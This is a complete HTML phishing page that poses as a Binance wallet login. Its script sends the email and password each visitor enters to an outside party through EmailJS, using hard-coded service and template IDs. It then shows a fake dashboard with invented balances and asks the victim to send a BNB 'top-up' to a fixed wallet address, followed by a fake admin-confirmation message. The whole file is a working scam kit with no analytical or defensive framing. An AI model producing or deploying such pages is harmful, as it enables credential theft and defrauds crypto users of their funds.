<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Binance Wallet Portal</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #181A20;
      color: #EAECEF;
      font-weight: bold;
    }
    .page { display: none; padding: 20px; }
    .visible { display: block !important; }
    .form-container { max-width: 400px; margin: 0 auto; position: relative; }
    input, button {
      width: 100%; padding: 12px; margin: 10px 0;
      border-radius: 6px; border: none;
      font-size: 1rem;
    }
    button {
      background-color: #f3ba2f;
      color: #181A20;
      font-weight: bold;
    }
    .token {
      background: #2E3239;
      display: flex; justify-content: space-between;
      padding: 15px; border-radius: 10px;
      margin: 10px 0; align-items: center;
    }
    .status-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    #walletStatus {
      background-color: #f3ba2f;
      color: #181A20;
      padding: 4px 10px;
      border-radius: 5px;
      font-size: 0.8rem;
    }
    .button-group {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
    }
    .button-group button {
      flex: 1 1 30%;
    }
    img.coin-logo {
      width: 24px;
      height: 24px;
      margin-right: 8px;
    }
  </style>
</head>
<body onload="initApp()"><!-- Page 1: Sign In --><div class="page visible" id="page1">
  <div class="form-container">
    <h2>Binance Wallet Login</h2>
    <input type="email" id="email" placeholder="Email" required />
    <input type="password" id="pass" placeholder="Password" required />
    <button onclick="submitSignin()">Confirm</button>
  </div>
</div><!-- Page 2: Processing --><div class="page" id="page2">
  <div class="form-container">
    <h2>Authenticating...</h2>
    <p>Please wait...</p>
    <button onclick="confirmAccess()">Continue</button>
  </div>
</div><!-- Page 3: Account ID --><div class="page" id="page3">
  <div class="form-container">
    <h2>Enter Account ID</h2>
    <input type="text" placeholder="Account ID" />
    <button onclick="confirmID()">Confirm</button>
  </div>
</div><!-- Page 5: Dashboard --><div class="page" id="page5">
  <div class="form-container">
    <div class="status-bar">
      <h2>Dashboard</h2>
      <span id="walletStatus"></span>
    </div>
    <p style="color: #f3ba2f;">Total Assets: <strong id="totalAssets">$2078.78</strong></p>
    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p><div class="token">
  <div><img class="coin-logo" src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" /> USDT</div>
  <div id="usdt_amount">$0.00</div>
</div>

<div class="token">
  <div><img class="coin-logo" src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB" /> BNB</div>
  <div id="bnb_amount">$0.00</div>
</div>

<div class="button-group">
  <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
  <button onclick="goToScan('Receive')">Receive</button>
  <button onclick="goToScan('Top Up BNB')">Top Up BNB</button>
</div>
<button onclick="logoutUser()" style="margin-top: 20px; background:#f6465d; color:white;">Sign Out</button>

  </div>
</div><!-- Page 6: Scan + Hash Input --><div class="page" id="page6">
  <div class="form-container">
    <h2 id="scanAction">Action</h2>
    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=150x150" alt="QR Code" />
    <p>Send to: <strong style="color:#f3ba2f;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</strong></p>
    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
    <button onclick="submitTransaction()">Confirm Transaction</button>
    <div id="txStatus"></div>
    <button onclick="returnToDashboard()">Return</button>
  </div>
</div><!-- Page 7: Wallet Connect Page --><div class="page" id="page7">
  <div class="form-container">
    <h2>Connect Your Wallet</h2>
    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address" />
    <button onclick="confirmWallet()">Confirm Wallet</button>
    <button onclick="returnToDashboard()">Return to Dashboard</button>
  </div>
</div><script>
const emailService = "service_78wwbgl";
const signinTemplate = "template_omkmcio";
const publicKey = "ochPV1QVtay7TOdBA";

function initApp() {
  emailjs.init(publicKey);
  const step = localStorage.getItem("binance_step") || "1";
  showPage(step);
  if (step === "5") loadDashboard();
}

function showPage(id) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("visible"));
  document.getElementById("page" + id).classList.add("visible");
  localStorage.setItem("binance_step", id);
}

function submitSignin() {
  const email = document.getElementById("email").value;
  const pass = document.getElementById("pass").value;
  localStorage.setItem("email", email);
  const payload = { user_email: email, user_password: pass };
  emailjs.send(emailService, signinTemplate, payload).then(() => {
    showPage("2");
  });
}

function confirmAccess() { setTimeout(() => showPage("3"), 2000); }
function confirmID() { setTimeout(() => { showPage("5"); loadDashboard(); }, 2000); }
function returnToDashboard() { showPage("5"); loadDashboard(); }

function goToScan(action) {
  document.getElementById("scanAction").innerText = action;
  showPage("6");
}

function confirmWallet() {
  const wallet = document.getElementById("walletAddress").value;
  if (!wallet || wallet.length < 10) {
    alert("Enter a valid BEP20 wallet address");
    return;
  }
  localStorage.setItem("wallet_address", wallet);
  showPage("5");
  loadDashboard();
}

function loadDashboard() {
  const address = localStorage.getItem("wallet_address");
  document.getElementById("walletStatus").textContent = address ? `Connected: ${address.slice(0, 6)}...${address.slice(-4)}` : "Not Connected";
  document.getElementById("usdt_amount").textContent = "$2078.78";
  document.getElementById("bnb_amount").textContent = "0.26 BNB";
  document.getElementById("totalAssets").textContent = "$2078.78";
}

function submitTransaction() {
  const tx = document.getElementById("txHash").value;
  if (tx.length < 10) return alert("Enter valid transaction hash");
  document.getElementById("txStatus").innerHTML = "<p>Sent âœ… Waiting for admin confirmation...</p>";
  setTimeout(() => {
    alert("Transaction processed.");
    returnToDashboard();
  }, 3000);
}

function logoutUser() {
  if (confirm("Are you sure you want to log out?")) {
    localStorage.clear();
    location.reload();
  }
}
</script></body>
</html>
